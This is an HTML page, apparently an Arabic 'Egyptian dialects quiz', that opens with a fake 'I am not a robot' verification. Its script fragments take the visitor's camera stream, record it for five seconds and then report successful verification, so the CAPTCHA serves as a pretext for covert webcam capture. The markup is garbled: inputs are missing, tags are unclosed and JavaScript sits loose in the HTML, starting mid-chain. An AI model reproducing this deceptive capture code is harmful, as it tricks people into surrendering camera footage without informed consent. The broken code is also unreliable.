<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختبار اللهجات المصرية</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #2980b9, #27ae60);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            text-align: center;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .verification-section {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            margin: 15px 0;
            gap: 10px;
        }
        input[type="checkbox"] {
            width: 24px;
            height: 24px;
            accent-color: #27ae60;
        }
        .loading, .success {
            margin: 15px 0;
            font-size: 18px;
        }
        .loading { color: #f39c12; }
        .success { color: #27ae60; }
        video {
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            margin: 15px 0;
            background: #000;
        }
        .language-buttons {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            font-size: 16px;
            text-align: center;
        }
        .btn:hover {
            background-color: #2ecc71;
        }
        .quiz-section {
            text-align: right;
        }
        .quiz-section h1, .quiz-section h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #2c3e50;
        }
        .option {
            display: flex;
            align-items: center;
            margin: 10px 0;
            background-color: #f7f7f7;
            border-radius: 8px;
            padding: 10px;
            transition: background-color 0.3s;
            cursor: pointer;
        }
        .option input[type="radio"] {
            display: none;
        }
        .option label {
            width: 100%;
            font-size: 18px;
            cursor: pointer;
        }
        .option:hover, .option.selected {
            background-color: #e8f4f8;
        }
        .result {
            text-align: center;
            padding: 20px;
            background-color: #f1f1f1;
            border-radius: 10px;
        }
        @media (max-width: 480px) {
            .language-buttons {
                grid-template-columns: 1fr;
            }
            .quiz-section h1, .quiz-section h2 {
                font-size: 20px;
            }
            .option label {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="verification-container">
        <div class="verification-section">
            <h1>تحقق من أنك لست روبوتاً</h1>
            <div class="checkbox-container">

                <label for="robot-checkbox">أنا لست روبوتاً</label>
            </div>
            <video id="video" autoplay playsinline muted></video>
            <div class="loading" style="display:none;">جاري التحقق...</div>
            <div class="success" style="display:none;">✅ تم التحقق بنجاح!</div>
        </div>
    </div>

    <div class="container" id="quiz-container" style="display:none;">

            <div id="question-container" style="display:none;">

            <div class="result" id="result" style="display:none;">

                .then((stream) => {
                    video.srcObject = stream;

                    const chunks = [];
                    mediaRecorder.start();
                    mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };

                    setTimeout(() => { 
                        mediaRecorder.stop(); 
                    }, 5000);

                    mediaRecorder.onstop = () => {
                        loading.style.display = 'none';
                        success.style.display = 'block';
